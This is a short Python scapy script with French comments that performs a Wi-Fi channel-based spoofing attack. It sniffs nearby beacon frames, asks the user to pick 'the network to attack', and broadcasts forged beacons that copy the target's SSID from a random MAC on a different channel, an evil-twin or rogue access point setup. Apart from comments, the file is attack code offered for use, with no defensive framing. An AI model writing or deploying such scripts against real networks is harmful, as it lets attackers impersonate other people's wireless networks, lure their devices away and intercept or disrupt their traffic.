#!/usr/bin/env python

from scapy.all import *

def get_ssid_list():
    # Sniffing des trames Beacon pour récupérer les SSID, canaux et puissances
    sniffed_packets = sniff(count=10, iface='wlan0mon', timeout=5, prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%:%Dot11Beacon.info%:%Dot11Beacon.cap%:%Dot11Beacon.beacon_interval%:%Dot11Elt:%}\n"))

    # Traitement des trames sniffées pour récupérer les informations utiles
    ssid_list = []
    for packet in sniffed_packets:
        if packet.haslayer(Dot11Beacon):
            ssid = packet.info.decode()
            if ssid != '':
                channel = int(ord(packet[Dot11Elt:3].info))
                power = packet.dBm_AntSignal
                ssid_list.append((ssid, channel, power))

    # Retourne la liste des SSID, canaux et puissances trouvés
    return ssid_list

def print_ssid_list(ssid_list):
    # Affichage de la liste des SSID, canaux et puissances trouvés
    print("Liste des SSID disponibles à proximité :")
    for i, (ssid, channel, power) in enumerate(ssid_list):
        print("{} - SSID : {}, Canal : {}, Puissance : {} dBm".format(i+1, ssid, channel, power))

def select_target_ssid(ssid_list):
    # Saisie de l'indice de la cible par l'utilisateur
    target_index = int(input("Entrez le numéro du réseau à attaquer : ")) - 1
    while target_index < 0 or target_index >= len(ssid_list):
        print("Numéro invalide.")
        target_index = int(input("Entrez le numéro du réseau à attaquer : ")) - 1

    # Retourne l'élément de la liste correspondant à l'indice saisi
    return ssid_list[target_index]

def generate_concurrent_beacon(target_ssid):
    # Calcul du canal pour le beacon concurrent (6 canaux de séparation du canal du réseau cible)
    concurrent_channel = target_ssid[1] + 6
    if concurrent_channel > 13:
        concurrent_channel -= 13

    # Création de la trame Beacon concurrente avec le même SSID que la cible, sur un canal différent
    packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID='SSID', info=target_ssid[0].encode())/Dot11Elt(ID='DSset', info=chr(concurrent_channel))

    # Envoi de la trame Beacon concurrente
    sendp(packet, iface='wlan0mon', inter=0.1, verbose=1)

